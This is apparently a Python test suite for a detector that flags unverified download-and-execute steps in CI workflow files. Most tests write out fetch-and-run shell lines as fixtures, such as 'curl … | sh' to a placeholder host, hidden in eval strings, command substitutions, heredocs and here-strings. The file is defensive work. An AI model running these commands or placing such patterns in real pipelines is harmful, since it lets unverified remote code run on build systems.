        # `-H`/`-L`/`-P` precede the starting points and are not predicates;
        # reading one as "no roots" reopens the form.
        for option in ("-H", "-L", "-P"):
            self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                         ("run", r"find %s /tmp -name p -exec chmod +x {} \;"
                                 % option + "\n"))

    def test_a_find_with_no_starting_point_walks_the_working_directory(self):
        # The commonest spelling of all: no root means `.`.
        self.flagged(("get", "curl -sfL https://example.test/p -o p\n"),
                     ("run", r"find -name p -exec chmod +x {} \;" "\n"))

    def test_a_find_over_another_tree_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", r"find /opt -name p -exec chmod +x {} \;" "\n"))

    # a heredoc body consumed inside a substitution (added by #1697's review:
    # it used to CRASH, and now it is read as a word).
    def test_a_heredoc_body_inside_a_substitution_is_unread(self):
        self.accepted(("run", 'eval "$(cat <<\'EOF\'\n'
                              "curl -sfL https://example.test/p -o /tmp/p\n"
                              "chmod +x /tmp/p\n"
                              'EOF\n)"\n'))
        # Handed to an interpreter there too (review I-4): bash 3.2 and 5.2
        # run the payload, and the re-read holds only the lifted body's marker.
        self.accepted(("run", "x=$(bash -s <<'EOF'\n"
                              "curl -fsSL https://example.test/i.sh | sh\n"
                              "EOF\n)\n"))

    def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
        # Review I-4 of the #1793 follow-ups: a substitution is read for what
        # it fetches, never for the script a shell inside it is handed, so
        # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
        # payload. Until substitutions are flattened, such a script is walked
        # and reported unread when it fetches or holds a form the guard cannot
        # read, a script it hands on included (re-review N-A), or when the job
        # downloads at all. A heredoc there is read only when its `EOF)` leaves
        # the body in the substitution's own text; lifted out, it is the entry
        # above.
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                       "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
                       "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
                       'echo "$(sudo bash -ec \'%s\')"\n' % payload,
                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload,
                       "x=$(sh -c 'v=$(bash -c \"%s\")')\n" % payload,
                       "x=$(sh -c 'sudo $CMD')\n"):
            with self.subTest(script=script):
                self.assertIn("inside a command substitution", self.flagged(("run", script)))
        # One that downloads nothing still may run what the job downloaded,
        # which the guard does not follow into a substitution; bash runs both.
        for steps in ((("run", "curl -fsSL -o t.sh https://example.test/i.sh\n"
                               "x=$(sh -c 'bash t.sh')\n"),),
                      (("get", "curl -fsSL -o t.sh https://example.test/i.sh\n"),
                       ("run", "x=$(sh -c '. ./t.sh')\n"))):
            with self.subTest(steps=steps):
                self.assertIn("inside a command substitution", self.flagged(*steps))
        # In a job that downloads nothing, one that fetches nothing and holds
        # no such form has nothing to check (re-review N-A): these read clean.
        for script in ("VERSION=$(bash -c 'echo 1')\n", 'OUT=$(sh -c "make -s print-version")\n',
                       "VERSION=$(bash -ec 'echo 1')\n", 'OUT=$(sh -ec "make -s print-version")\n',
                       "x=$(bash <<< 'echo hi')\n", "v=$(bash -lc 'node --version')\n",
                       'echo "$(sudo bash -c \'cat /etc/os-release\')"\n',
                       "x=`sh -c 'echo 1'`\n", 'h=$(eval echo "~$USER")\n',
                       "diff <(sh -c 'echo a') <(sh -c 'echo b')\n",
                       "x=$(bash -s <<'EOF'\necho hi\nEOF)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))
        # The must-trip controls: outside a substitution, read as before.
        for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
                              ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
            with self.subTest(script=script):
                self.assertIn("straight to `%s`" % shell, self.flagged(("run", script)))
        # No script handed to a shell: nothing to read.
        for script in ('x=$(jq -r .a <<< "$META")\n', "x=$(cat <<< '%s')\n" % payload,
                       "x=$(bash x.sh)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))

    # the OTHER heredoc spelling (#1839, run-14 SEC-3915165799): a body handed
    # to an interpreter as the PROGRAM it runs, which was neither read nor
    # reported. A QUOTED body is the text it was written as, so it is read like
    # an `eval` string; an EXPANDING one -- and a program in a language this
    # module has no grammar for -- is REPORTED unread.
    def test_a_quoted_heredoc_script_on_bashs_stdin_is_read(self):
        why = self.flagged(("install", "bash -s <<'EOF'\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("straight to `sh`", why)

    def test_every_spelling_that_puts_the_script_on_stdin_is_read(self):
        # Bare, `-s`, an explicit `-`, and `-s` with positional parameters
        # after it: each hands the body to the interpreter as its script.
        for opener in ("sh", "bash", "dash", "zsh", "bash -", "bash /dev/stdin",
                       "bash -euo pipefail", "bash -s -- --yes", "sudo bash -s"):
            with self.subTest(opener=opener):
                why = self.flagged(
                    ("install", "%s <<'EOF'\n"
                                "curl -sfL https://example.test/p -o /tmp/p\n"
                                "chmod +x /tmp/p\n"
                                "EOF\n" % opener))
                self.assertIn("/tmp/p", why)

    def test_a_checksum_inside_the_heredoc_script_still_clears_it(self):
        # The expansion keeps the ORDER, exactly as the `sh -c` string above:
        # a step hardened inside its own heredoc comes out hardened, where
        # `set -e` makes the checksum stop the script (review I-2).
        script = ("bash -s <<'EOF'\n%s"
                  "curl -sfL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | sha256sum -c -\n'
                  "chmod +x /tmp/p\n"
                  "EOF\n")
        self.accepted(("install", script % ("set -euo pipefail\n", HEX)))
        self.assertIn("carries on past its failure",
                      self.flagged(("install", script % ("", HEX))))

    def test_an_expanding_heredoc_script_is_reported_unread(self):
        why = self.flagged(("install", "bash -s <<EOF\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("EXPANDING", why)
        self.assertIn("bash", why)

    def test_a_heredoc_program_in_another_language_is_reported_unread(self):
        for opener in ("python3 -", "python3", "perl", "node"):
            with self.subTest(opener=opener):
                why = self.flagged(
                    ("install", "%s <<'EOF'\n"
                                "get('https://example.test/p', '/tmp/p')\n"
                                "EOF\n" % opener))
                self.assertIn(opener.split()[0], why)

    def test_a_clean_quoted_heredoc_script_is_neither_read_nor_reported(self):
        self.accepted(("install", "bash -s <<'EOF'\necho hello\nEOF\n"))

    def test_a_heredoc_that_is_a_programs_INPUT_is_not_its_script(self):
        # `bash x.sh <<'EOF'` feeds x.sh's standard input, and x.sh is a file
        # in the repo under review -- the author-deterministic ruling above.
        # `sh -c '<script>'`, `python3 -m <module>` and a plain `cat` say the
        # same thing: the program is somewhere else, so the body is its data.
        for opener in ("bash /tmp/x.sh", "sh -c 'cat'", "python3 -m pytest",
                       "cat", "sha256sum -c"):
            with self.subTest(opener=opener):
                self.accepted(
                    ("install", "%s <<'EOF'\n"
                                "curl -fsSL https://example.test/i.sh | sh\n"
                                "EOF\n" % opener))

    def test_a_heredoc_written_to_a_file_and_then_run_stays_out_of_scope(self):
        # Probe case E: the script is text this repository wrote.
        self.accepted(("install", "cat <<'EOF' > /tmp/i.sh\n"
                                  "curl -fsSL https://example.test/i.sh | sh\n"
                                  "EOF\n"
                                  "bash /tmp/i.sh\n"))

    def test_the_fleets_here_string_is_not_a_heredoc_program(self):
        # docker-publish.yml's shape: `<<<` is the one heredoc-ish construct
        # the fleet writes, and it must not become a report.
        self.accepted(("tags", "docker buildx imagetools create "
                               "$(jq -cr '.tags' <<< \"$META\")\n"))

    def test_an_interpreters_here_string_program_is_read(self):
        # #2293: `sh <<< '<script>'` hands the shell its script on stdin, as
        # `bash -s <<'EOF'` does. Bash 3.2 and 5.2 run the download in each of
        # these, which the guard read clean; a here-string bash expands first
        # is reported unread, as an expanding heredoc is, and so is a program
        # in another language.
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ("sh <<< '%s'\n", 'bash -s -- --yes <<< "%s"\n', "zsh <<<'%s'\n",
                       "sudo sh <<< $'%s'\n", "sh 3<<< '%s' 0<&3\n",
                       "sh <<< 'echo a' <<< 'echo b\n%s'\n", "eval \"sh <<< '%s'\"\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % payload))
                self.assertIn("straight to `sh`", why)
        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n',
                       "sh <<< $'%s\\n'\n" % payload):
            with self.subTest(script=script):
                self.assertIn("EXPANDING", self.flagged(("install", script)))
        self.assertIn("python3", self.flagged(("install", "python3 <<< 'print(1)'\n")))
        # The here-string is not the program: another descriptor, a `-c`
        # string or a script file first, stdin replaced after it -- or no
        # interpreter at all.
        for script in ("cat <<< '%s'\n", "sh 3<<< '%s'\n", "sh -c 'cat' <<< '%s'\n",
                       "bash x.sh <<< '%s'\n", "sh <<< '%s' < /dev/null\n",
                       'read -r a b <<< "%s"\n'):
            with self.subTest(script=script):
                self.accepted(("install", script % payload))
        # A script hardened inside it comes out hardened where the checksum
        # stops it: bash 3.2 and 5.2 run /tmp/p with the checksum failing
        # without the `set -e;`, and not with it (review I-2).
        checked = ("sh <<< '%scurl -fsSL -o /tmp/p https://example.test/p; "
                   'echo "%s  /tmp/p" | sha256sum -c -; sh /tmp/p\'\n')
        self.assertIn("carries on past its failure",
                      self.flagged(("install", checked % ("", HEX))))
        self.accepted(("install", checked % ("set -e; ", HEX)))

    def test_a_second_heredoc_on_the_line_leaves_the_stdin_script_read(self):
        # #2128: the reader lifted one heredoc per line, so `3<<'B'` after the
        # script was read as `<` of a file called B, which replaced stdin and
        # dropped the script unread. Every body is lifted now, each filed
        # under its own descriptor, in either order.
        for script in ("bash -s <<'A' 3<<'B'\n%s\nA\ndata\nB\n",
                       "bash -s 3<<'B' <<'A'\ndata\nB\n%s\nA\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % (
                    "curl -fsSL https://example.test/i.sh | sh")))
                self.assertIn("straight to `sh`", why)

    def test_the_two_probe_controls_still_trip(self):
        self.flagged(("install", "curl -fsSL https://example.test/i.sh | sh\n"))
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "chmod +x /tmp/p\n"))

    # 10. the `if:` comparison, and its YAML twin of `|| true`.
    def test_a_check_step_carrying_continue_on_error(self):
        # `continue-on-error: true` is the YAML twin of `|| true`: the step
        # fails and the job carries on. Read through the document, because the
        # field is YAML the guard already has in hand.
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": True,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_job_level_continue_on_error_reaches_every_step(self):
        doc = {"jobs": {"b": {"continue-on-error": True, "steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_check_step_without_it_still_clears_the_fetch(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": False,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.accepted(*wg.run_steps(doc))

    def test_a_soft_step_still_counts_as_fetching(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "continue-on-error": True,
             "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_condition_compared_as_written_is_assumed_stable(self):
        # `env.NEED` is rewritten between the two steps, so the SAME text is
        # not the same answer -- but the guard compares the text.
        when = "env.NEED == 'yes'"
        self.accepted(
            wg.Step("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
            wg.Step("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX, None, when),
            wg.Step("flip", 'echo "NEED=no" >> "$GITHUB_ENV"\n'),
            wg.Step("run", "chmod +x /tmp/p\n/tmp/p\n", None, when))

    # 11. a directory on the runner's PATH past `PATH_DIRS`, or one a step
    # puts there itself (#2308 closed the fixed ones:
    # `TestADownloadWrittenIntoADirectoryOnPath`; review N-4 named the rest).
    def test_a_directory_a_step_puts_on_path(self):
        fetch = ("get", "curl -sfL https://example.test/p -o bin/payload\n")
        self.accepted(fetch, ("path", 'echo "$PWD/bin" >> "$GITHUB_PATH"\n'),
                      ("run", "payload --version\n"))
        self.accepted(fetch, ("run", 'export PATH="$PWD/bin:$PATH"\npayload --version\n'))
        self.flagged(("get", "curl -sfL https://example.test/p -o /usr/local/bin/payload\n"),
                     ("run", "payload --version\n"))
        # ... and the runner image's own directories past `PATH_DIRS` (review
        # N-4), which bash 3.2 and 5.2 find a bare name in when on PATH.
        for dest in ('"$HOME/.cargo/bin/payload"', "/snap/bin/payload"):
            self.accepted(("get", "curl -sfL https://example.test/p -o %s\n" % dest),
                          ("run", "payload --version\n"))


class TestRunSteps(unittest.TestCase):
    """The reader the repo-wide rule and the CLI share."""

    DOC = {"jobs": {"build": {"steps": [
        {"name": "checkout", "uses": "actions/checkout@" + "0" * 40},
        {"name": "install", "run": "curl -fsSL https://example.test/i.sh | sh\n"},
        {"run": "make test\n"},
    ]}}}

    def test_every_run_step_is_yielded_with_its_name(self):
        self.assertEqual(
            [wg.Step("install", "curl -fsSL https://example.test/i.sh | sh\n", None),
             wg.Step("<unnamed step>", "make test\n", None)],
            list(wg.run_steps(self.DOC)))

    def test_a_document_with_no_jobs_yields_nothing(self):
        self.assertEqual([], list(wg.run_steps({})))


class TestCli(unittest.TestCase):
    """`python3 scripts/workflow_guard.py .github/workflows/*.yml` -- the same
    rule the suite runs, for a human holding a shell."""

    WORKFLOW = ("name: t\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - name: install\n"
                "        run: curl -fsSL https://example.test/i.sh | sh\n")

    def test_it_reports_and_fails_on_an_unverified_fetch(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
            self.assertTrue(any("install" in ln for ln in lines), lines)

    def test_a_clean_workflow_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ok.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW.replace(
                    "curl -fsSL https://example.test/i.sh | sh", "make test"))
            self.assertEqual(0, wg.main([path], out=lambda _line: None))

    def test_a_step_the_reader_refuses_is_named_and_the_rest_still_read(self):
        # A `shell_lex.Unreadable` escaped `main` as a traceback: it named no
        # workflow, job or step, and printed no other step's defect (#2252).
        steps = (("nested", "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF"),
                 ("same line", "echo \"$(cat <<EOF)\"\nit's\nEOF"),
                 ("read again", "echo `echo $(cat <<EOF)`"),
                 ("delimiter", "cat <<$(a b)\nit's\n$(a b)\n"
                               "curl -fsSL https://example.test/i.sh | sh"),
                 ("install", "curl -fsSL https://example.test/i.sh | sh"))
        workflow = self.WORKFLOW[:self.WORKFLOW.index("      - name:")] + "".join(
            "      - name: %s\n        run: |\n%s" % (name, "".join(
                "          %s\n" % line for line in script.split("\n")))
            for name, script in steps)
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(workflow)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
        self.assertEqual(len(steps) + 1, len(lines), lines)
        for (name, _script), line in zip(steps, lines):
            self.assertTrue(line.startswith("bad.yml / b / %s -- " % name), line)
        for line in lines[:4]:
            self.assertIn(" -- cannot read this step: ", line)
        self.assertIn("straight to `sh`", lines[4])
        # The count names what it counts, a refused step as well as a fetch.
        self.assertEqual("5 defect(s): unverified fetch-and-exec, or code the guard cannot "
                         "read; see scripts/workflow_guard.py", lines[5])


if __name__ == "__main__":  # pragma: no cover
    unittest.main()


class TestRedirectAndMarkerProvenance(unittest.TestCase):
    URL = 'https://example.test/i.sh'

    def test_redirect_variants_bind_use_and_checksum(self):
        for redirect in ('>f', '>>f', '>|f', '&>f', '&>>f',
                         ' 3>f 1>&3', ' 3>f 1>&3 3>g', ' 2>f 1>&2', ' 2>&1>f'):
            with self.subTest(redirect=redirect):
                fetch = 'curl ' + self.URL + redirect
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + ' && sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_dynamic_destination_is_unknown_without_claiming_execution(self):
        for output in ('> $(mktemp)', '-o "$(mktemp)"', '-o$(mktemp)',
                       '--output=$(mktemp)', '--output-dir=$(mktemp) -o f',
                       ' 3>$(mktemp) 1>&3'):
            with self.subTest(output=output):
                defect = wg.fetch_exec_defect('curl ' + self.URL + ' ' + output)
                self.assertIsNotNone(defect)
                self.assertIn('unknown destination', defect)
                self.assertNotIn('running', defect)
                self.assertNotIn('@@', defect)
        self.assertIsNone(wg.fetch_exec_defect('curl ' + self.URL))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'f=$(mktemp); curl ' + self.URL + ' > "$f"; sh "$f"'))

    def test_literals_in_nested_scripts_are_not_filtered(self):
        for wrapper in ('eval', 'sh -c'):
            for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                           '@@group-open@@', '@@group-close@@'):
                script = wrapper + ' "echo ' + marker + '; curl ' + self.URL + ' | sh"'
                self.assertIsNotNone(wg.fetch_exec_defect(script), script)

    def test_literal_substitution_is_not_credited_twice(self):
        script = 'eval "@@subst0@@" "$(curl ' + self.URL + ')"'
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_literal_case_marker_does_not_promote_command(self):
        self.assertEqual([], wg.fetches('@@casearm@@curl ' + self.URL + ' | sh'))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'case x in a|b) echo @@casearm@@; curl ' + self.URL + ' | sh;; esac'))

    def test_literal_destination_stays_literal_beside_real_substitution(self):
        for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                       '@@group-open@@', '@@group-close@@'):
            # A second URL/operand after curl is an unread multiple-transfer
            # case; the header operand tests substitution handling separately.
            fetch = 'curl ' + self.URL + ' -H "$(echo unused)" > "' + marker + '"'
            self.assertIsNone(wg.fetch_exec_defect(fetch))
            defect = wg.fetch_exec_defect(fetch + '; sh "' + marker + '"')
            self.assertIsNotNone(defect)
            self.assertIn(marker, defect)
            self.assertNotIn('unknown destination', defect)


class TestDestinationProvenanceControls(unittest.TestCase):
    def test_only_the_final_stdout_sink_is_dynamic(self):
        script = 'curl https://example.test/i.sh >$(mktemp) >f; sh f'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertNotIn('unknown destination', defect)
        self.assertEqual('f', wg.fetches(script)[0].dest)
        self.assertIsNone(wg.fetch_exec_defect(
            'curl https://example.test/i.sh >$(mktemp) 1>&2'))

    def test_a_literal_eval_operand_beside_real_substitution_is_still_read(self):
        script = ('eval "echo @@subst0@@; curl https://example.test/literal | sh" '
                  '"$(curl https://example.test/substitution)"')
        self.assertEqual(2, len(wg.fetches(script)))
        defects = wg.fetch_exec_defects(script)
        self.assertEqual(2, len(defects))
        self.assertTrue(any('/literal' in d for d in defects))
        self.assertTrue(any('/substitution' in d for d in defects))


class TestExplicitDestinationPrecedence(unittest.TestCase):
    def test_named_output_is_not_replaced_by_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' f >$(mktemp)'
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNone(wg.fetch_exec_defect(fetch))
                defect = wg.fetch_exec_defect(fetch + '; sh f')
                self.assertIsNotNone(defect)
                self.assertNotIn('unknown destination', defect)

    def test_dynamic_named_output_is_not_hidden_by_static_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' $(mktemp) >f'
                self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_explicit_stdout_still_follows_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for stdout in ('-', '/dev/stdout'):
                with self.subTest(tool=tool, stdout=stdout):
                    fetch = tool + ' https://example.test/i.sh ' + output + ' ' + stdout + '>f'
                    self.assertEqual('f', wg.fetches(fetch)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch.replace('>f', '>$(mktemp)')))


class TestReviewedRedirectBoundaries(unittest.TestCase):
    def test_group_adjacent_redirects_bind_use_and_checksum(self):
        for fetch in ('(1>f curl https://example.test/a)',
                      '(3>f 1>&3 curl https://example.test/a)'):
            with self.subTest(fetch=fetch):
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_output_directory_does_not_change_explicit_stdout(self):
        for directory in ('out', '$(mktemp)'):
            for stdout in ('-', '/dev/stdout', '/dev/fd/1'):
                with self.subTest(directory=directory, stdout=stdout):
                    fetch = ('curl https://example.test/a --output-dir '
                             + directory + ' -o ' + stdout)
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    redirected = fetch + ' >f'
                    self.assertEqual('f', wg.fetches(redirected)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(redirected + '; sh f'))
                    checked = redirected + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch + ' >$(mktemp)'))

    def test_explicit_discard_does_not_follow_stdout_redirects(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for redirect in (' >$(mktemp)', ' 3>$(mktemp) 1>&3', ' >f'):
                with self.subTest(tool=tool, redirect=redirect):
                    fetch = tool + ' https://example.test/a ' + output + ' /dev/null' + redirect
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    self.assertIsNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    dynamic = fetch.replace(output + ' /dev/null', output + ' $(mktemp)')
                    self.assertIn('unknown destination', wg.fetch_exec_defect(dynamic))


class TestInferredFilenameOrigin(unittest.TestCase):
    FETCHERS = ('curl -O --output-dir', 'wget -P')

    def test_inferred_dash_filename_binds_directory_use_and_checksum(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g', ' >$(mktemp)'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' out https://example.test/-' + redirect
                    self.assertEqual('out/-', wg.fetches(fetch)[0].dest)
                    defect = wg.fetch_exec_defect(fetch + '; sh out/-')
                    self.assertIsNotNone(defect)
                    self.assertNotIn('unknown destination', defect)
                    checked = fetch + '\necho "' + HEX + '  out/-" | sha256sum -c -\nsh out/-'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIsNotNone(wg.fetch_exec_defect(
                        checked.replace('  out/-"', '  other"')))

    def test_inferred_dash_filename_keeps_dynamic_directory_provenance(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' "$(mktemp)" https://example.test/-' + redirect
                    self.assertTrue(shell_reader.has_substitution(wg.fetches(fetch)[0].dest))
                    self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_inferred_dash_without_directory_is_still_a_filename(self):
        for fetcher in ('curl -O', 'wget'):
            with self.subTest(fetcher=fetcher):
                fetch = fetcher + ' https://example.test/- >g'
                self.assertEqual('-', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh ./-'))


class TestIssue1852GuardSpellings(unittest.TestCase):
    FETCH = 'curl -fsSL https://example.test/p -o /tmp/d/p\n'
    USE = 'chmod +x /tmp/d/p\n'

    def test_long_check_flag_on_sha384_and_sha512_binds_the_download(self):
        for tool, digest in (('sha384sum', 'a' * 96),
                             ('sha512sum', 'b' * 128)):
            with self.subTest(tool=tool):
                check = 'echo "%s  /tmp/d/p" | %s --check -\n' % (digest, tool)
                self.assertIsNone(wg.fetch_exec_defect(self.FETCH + check + self.USE))
                other = 'echo "%s  /tmp/d/other" | %s --check -\n' % (digest, tool)
                self.assertIsNotNone(wg.fetch_exec_defect(
                    self.FETCH + other + self.USE))

    def test_long_recursive_chmod_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/d\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/other\n'))

    def test_find_execdir_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/d -name p -execdir chmod +x {} \;' + '\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/other -name p -execdir chmod +x {} \;' + '\n'))

    def test_download_executed_inside_arithmetic_remains_visible(self):
        script = 'echo $((1 + $(curl -fsSL https://example.test/install | sh)))\n'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/install', defect)

    def test_deep_arithmetic_does_not_hide_nested_download_from_guard(self):
        arithmetic = ('$((1+' * 1000 +
                      '$(curl -fsSL https://example.test/deep | sh)' + '))' * 1000)
        defect = wg.fetch_exec_defect('echo ' + arithmetic + '; echo done')
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/deep', defect)


class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
    """#1793 (COD-3418139920, COD-3636110933): steps the reader's lexing hid.

    `shell_reader.statements()` read comments, continuations and heredocs in
    three line-oriented passes that ran before any quote tracking, and its
    `$(...)` matcher took `\\"` inside a nested string for a closing quote.
    Each flagged step below pipes a download into `sh` after one such
    construct, and real bash runs that payload every time. Until the three
    passes became one quote-aware pass (`scripts/shell_lex.py`) the guard
    reported most of them clean -- through `job_defects`, the path the fleet
    test takes; the rest pin what that pass must read right as well.
    """

    PAYLOAD = "curl -fsSL https://example.test/i.sh | sh"

    def flagged(self, script):
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertIn("https://example.test/i.sh", found[0][1])

    def refused(self, script, *named):
        """The step the reader will not guess at is its one defect, reported
        under the step's name with the reason."""
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertEqual("step", found[0][0])
        self.assertRegex(found[0][1],
                         r"^cannot read this step: .+; nothing in it is accepted$")
        for text in named:
            self.assertIn(text, found[0][1])

    def test_a_hash_line_inside_a_multi_line_string_is_text(self):
        # V1 and V2; then V2 after a nested `"$(echo "it's")"`, whose
        # apostrophe is inside two strings, not the opening of a third.
        for opening in ('echo "multi\n# not a comment"',
                        "echo 'multi\n# not a comment'",
                        'echo "$(echo "it\'s")"\necho \'multi\n# not a comment\''):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_heredoc_operator_bash_does_not_read_swallows_nothing(self):
        # V3-V6: `<<WORD` inside "...", inside '...', inside a comment and as
        # the tail of a `<<<` here-string. Then inside backquotes, whose text
        # bash reads later as its own script, and as an arithmetic shift, in
        # `$((...))` and in the older `$[...]`.
        for opening, word in (('echo "<<true"', "true"),
                              ("echo '<<EOF'", "EOF"),
                              ("echo hi # see <<true", "true"),
                              ("cat <<<true", "true"),
                              ("echo `cat <<EOF`", "EOF"),
                              ("echo $((1<<X))", "X"),
                              ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_a_hash_that_does_not_start_a_word_is_text(self):
        # A `#` after a carriage return or a form feed -- word characters to
        # bash, whitespace to Python -- or inside `${...}` starts no comment;
        # a second comment rule in the statement splitter read all three as
        # one and hid the rest of the line.
        for opening in ("echo a\r# c", "echo a\x0c# c", "echo ${x:-a #b}"):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_backslash_ending_a_comment_or_a_quoted_body_continues_nothing(self):
        # V7: a comment ends at the newline, backslash or not. V8: a quoted
        # body is read verbatim, so its backslash cannot eat the terminator.
        self.flagged("echo hi # note \\\n%s\n" % self.PAYLOAD)
